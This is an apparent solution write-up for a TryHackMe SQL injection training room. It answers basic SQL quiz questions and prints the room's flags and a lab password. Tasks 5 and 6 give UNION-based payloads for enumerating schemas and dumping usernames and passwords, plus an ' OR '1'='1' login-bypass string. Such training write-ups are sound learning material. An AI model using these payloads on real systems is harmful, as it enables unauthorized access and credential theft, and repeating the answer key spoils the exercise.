# Solution

## URL
- [SQL Injection](https://tryhackme.com/room/sqlinjectionlm)

## Steps

### Task 1
#### What does SQL stand for?
1. The answer is `Structured Query Language`.

### Task 2:
#### What is the acronym for the software that controls a database?
1. The answer is `DBMS`.

#### What is the name of the grid-like structure which holds the data?
1. The answer is `Table`.

### Task 3:
#### What SQL statement is used to retrieve data?
1. The answer is `SELECT`.

#### What SQL clause can be used to retrieve data from multiple tables?
1. The answer is `UNION`.

#### What SQL statement is used to add data?
1. The answer is `INSERT`.

### Task 4:
#### What character signifies the end of an SQL query?
1. The answer is `;`.

### Task 5:
#### What is the flag after completing level 1?
1. First figure out the number of columns, using `UNION`.
2. For that use the payload `1+UNION+SELECT+1`, `1+UNION+SELECT+1,2` these will give errors for different number of columns.
3. But when you try to fetch 3 columns `1+UNION+SELECT+1,2,3`, this won't give any errors which tells us 3 columns were being fetched before.
4. Now since the page is being populated with the first entry in the returned result, we have to make that what we are fetching, so change the first number to 0.
5. Now to figure out the name of the database: `0+UNION+SELECT+1,database(),3`. Which will give `sqli_one` as result.
6. We colud have also just straightaway fetched the tables like this: `0+UNION+SELECT+1,group_concat(table_name),3+FROM+information_schema.tables+WHERE+table_schema+=+database()`. This will give us all tables which are: `article` and `staff_users`.
7. Now we will enumerate `staff_users` table.
8. So to enumerate the columns do this: `0+UNION+SELECT+1,group_concat(column_name),3+FROM+information_schema.columns+WHERE+table_name+=+'staff_users'`. This gives us 3 columns: `id`, `username` and `password`.
9. Now we can fetch `martin`'s password like this: `0+UNION+SELECT+id,username,password+FROM+staff_users+WHERE+username+=+'martin'`.
10. The password for username `martin` is `pa$$word`.
11. We could have fetched all username and passwords like this: `0+UNION+SELECT+1,group_concat(username, ' : ', password, '<br>'),3+FROM+staff_users`.
12. Submit `martin`'s password to get the flag: `THM{SQL_INJECTION_3840}`.

### Task 6:
#### What is the flag after completing level two? (and moving to level 3)
1. In this we have to bypass a login page.
2. The current SQL statement is `select * from users where username='' and password='' LIMIT 1;`.
3. If we enter `' OR '1'='1'+--+` in username field the query will become: `select * from users where username='' OR '1'='1'+--+' and password='' LIMIT 1;`.
4. This will make the whole condition true and we will bypass the authentication for the flag: `THM{SQL_INJECTION_9581}`.